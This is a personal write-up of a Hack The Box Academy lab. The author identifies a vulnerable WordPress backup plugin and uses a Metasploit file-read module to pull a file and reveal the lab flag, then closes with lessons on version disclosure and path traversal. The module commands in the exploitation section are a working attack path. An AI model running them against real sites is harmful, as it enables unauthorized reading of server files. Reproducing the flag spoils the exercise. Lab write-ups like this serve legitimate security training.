# Hack The Box: Pentesting Basics - Public Exploits

**Module:** Pentesting Basics  
**Section:** Public Exploits  
**Date:** November 29, 2025  

## Objective
To demonstrate the identification and exploitation of a known vulnerability in a legacy WordPress plugin ("Simple Backup Plugin 2.7.10") to retrieve a flag from a target system.

## 1. Network Connectivity & Setup
First, I established a connection to the Hack The Box internal network and verified reachability to the target.

* **VPN Connection:** Connected to the lab network using the provided OpenVPN configuration.
    ```bash
    sudo openvpn academy-regular.ovpn
    ```
* **Target Spawning:** Spawned the target instance.
    * **IP:** `94.237.58.137`
    * **Port:** `50410`
* **Verification:** Verified the target was online using ICMP ping.
    ```bash
    ping 94.237.58.137
    ```

## 2. Reconnaissance
I navigated to the target URL `http://94.237.58.137:50410` in a web browser to inspect the application.

* **Observation:** The landing page displayed a banner identifying the software stack.
* **Service Identification:** Found **Simple Backup Plugin 2.7.10** installed on a WordPress instance.

## 3. Vulnerability Analysis
Using the version number discovered during reconnaissance, I searched for known vulnerabilities.

* **Search Query:** "Simple Backup Plugin 2.7.10 for WordPress exploit"
* **Findings:** I located a directory traversal vulnerability referenced in the Rapid7 database.
    * **Vulnerability:** Arbitrary File Read
    * **Exploit Module:** `auxiliary/scanner/http/wp_simple_backup_file_read`
    * **Reference:** [Rapid7 Database - Simple Backup File Read](https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/)

## 4. Exploitation
I used the Metasploit Framework to automate the exploitation process.

1.  **Launch Metasploit:**
    ```bash
    msfconsole
    ```
2.  **Select Module:**
    ```bash
    use auxiliary/scanner/http/wp_simple_backup_file_read
    ```
3.  **Configure Options:**
    I set the target host and port to match the spawned instance.
    ```bash
    set RHOSTS 94.237.58.137
    set RPORT 50410
    ```
4.  **Execution:**
    Ran the exploit to trigger the directory traversal and download the target file.
    ```bash
    run
    ```

## 5. Loot & Flag Retrieval
The exploit successfully bypassed access controls and downloaded the requested file. Metasploit saved the "loot" to a local text file.

* **Loot Location:** `/home/username/.msf4/loot/20251129223648_default_94.237.58.137_simplebackup.tra_014132.txt`
* **Retrieving Flag:** I opened the saved file to view the contents.
    ```bash
    cat /home/username/.msf4/loot/20251129223648_default_94.237.58.137_simplebackup.tra_014132.txt
    ```

### **Flag**
```text
HTB{my_f1r57_h4ck}
```

## 6. Lessons Learned

**1. The Criticality of Banner Grabbing**
This exercise highlighted how dangerous "Information Disclosure" can be. The target website explicitly displayed the plugin name and version (`Simple Backup Plugin 2.7.10`) in the banner. In a real-world scenario, this is often the first step in the "Cyber Kill Chain"—reconnaissance. Hiding version numbers (Security by Obscurity) isn't a fix, but displaying them openly invites automated scanners to find vulnerabilities.

**2. From Version to Vulnerability**
The workflow demonstrated here is foundational to vulnerability assessment:
`Identify Service` -> `Identify Version` -> `Search Public Databases (Exploit-DB, Rapid7, CVE)` -> `Exploit`.
It emphasizes that even if the core OS is secure, a single outdated plugin can compromise the entire system.

**3. Understanding Directory Traversal**
While Metasploit automated the attack, the underlying vulnerability was a **Directory Traversal** (or Path Traversal) issue. The plugin likely failed to sanitize user input, allowing the attacker to "climb out" of the web root directory (using `../`) to access sensitive system files.
